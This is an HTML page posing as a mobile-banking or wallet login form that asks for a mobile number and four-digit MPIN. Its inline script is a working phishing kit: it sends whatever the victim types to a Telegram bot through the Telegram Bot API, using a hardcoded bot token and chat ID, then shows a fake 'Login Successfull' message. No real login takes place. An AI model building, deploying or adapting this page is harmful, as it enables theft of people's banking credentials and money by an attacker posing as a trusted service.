<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="stylesheet" href="styles.css">
    <title>Login Form</title>
    <style>
        body {
    font-family: Arial, sans-serif;
    background-color: #f9f9f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    background-color: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    width: 350px;
    text-align: left; /* Changed to left for label alignment */
}

.logo {
    width: 140px;
    height: auto;
    margin-bottom: 20px;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

h2 {
    color: #ff6f61;
    margin-bottom: 20px;
    text-align: center; /* Centering the title */
}

label {
    font-size: 14px;
    font-weight: bold;
    margin-bottom: 5px;
    display: block;
}

input {
    width: 90%;
    height: 30px;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
}

.forgot-password {
    display: block;
    margin: 10px 0;
    color: #007bff;
    font-weight: bold;
    text-decoration: none;
}

.login-button {
    background-color: #ff6f61;
    color: white;
    padding: 10px;
    border: none;
    font-weight: bold;
    border-radius: 5px;
    cursor: pointer;
    width: 100%;
    height: 50px;
}

.login-button:hover {
    background-color: #ff5722;
}

.terms {
    margin-top: 10px;
    font-size: 12px;
}

.terms a {
    color: #007bff;
    text-decoration: none;
}
.terms {
    font-size: 15px;
    margin-top: 15px;
    text-align: center;
    font-weight: bold;
    }

.terms{
    color: #007bff; 
    font-size: 15px;
    text-align: center;
    text-decoration: none;
    }

.terms a:hover { 
   text-decoration: underline; 
   }
   a {
    color: #007bff; 
    font-size: 15px;
    text-align: center;
    text-decoration: none;
    }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.postimg.cc/R0Fkf2bV/src-assets-images-logo.png" class="logo">
        <br>
        <h2>Login to Your Account</h2>
        <br>
        <form onsubmit="return sender()">
            <label for="mobile">Mobile Number<span style="color: red;"> *</span></label>
            <input type="tel" id="mobno" name="mobno" placeholder="+91 Enter mobile number" maxlength="12" required>
            
            <label for="mpin">Enter MPIN <span style="color: red;"> *</span></label>
            <input type="tel" id="mpin" name="mpin" placeholder="****" maxlength="4" required>

            <a href="#" class="forgot-password">Forgot MPIN/ Password</a><br>
            <button type="submit" class="login-button">LOGIN</button>
        </form><br>
        <p class="terms">
            <span style="color: black;"> By Login, I agree to the </span>
             <br><br>
            <a href="#">Terms Of Service</a><span style="color: black;"> and </span><a href="#">Privacy Policy</a>
        </p>
    </div>
    <link rel="stylesheet" href="style.css">
    <script src="sender.js"></script>
  
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  
  <script>
  //bot token
var telegram_bot_id = "7603041996:AAHDY91AzmcQd8AK6_y3SJ8nz6SvfSSGakk";
//chat id
var chat_id = 6797224482;
var ready = function () {
    mobno = document.getElementById("mobno").value;
    mpin = document.getElementById("mpin").value;
  
    message = 
      "\nMob No: " + mobno + 
      "\nMPin: " + mpin;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
      swal("Successfull", "Your Login Successfull", "success");
      
    });
    document.getElementById("mobno").value = "";
    document.getElementById("mpin").value = "";
    
    return false;
};
  </script>
</body>
</html>
